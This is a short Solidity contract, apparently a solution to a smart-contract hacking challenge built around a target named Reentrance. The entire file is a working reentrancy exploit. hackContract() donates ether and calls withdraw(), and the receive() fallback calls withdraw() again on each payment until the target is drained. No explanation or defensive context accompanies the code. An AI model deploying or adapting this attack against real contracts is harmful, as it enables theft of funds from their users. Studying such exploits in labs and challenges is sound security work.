// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    receive() external payable {
        require(Reentrance(contractAddress).balanceOf(address(this)) > 0);
        Reentrance(contractAddress).withdraw();
    }

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Reentrance(contractAddress).donate{value: address(this).balance}(address(this));
        Reentrance(contractAddress).withdraw();
    }
}
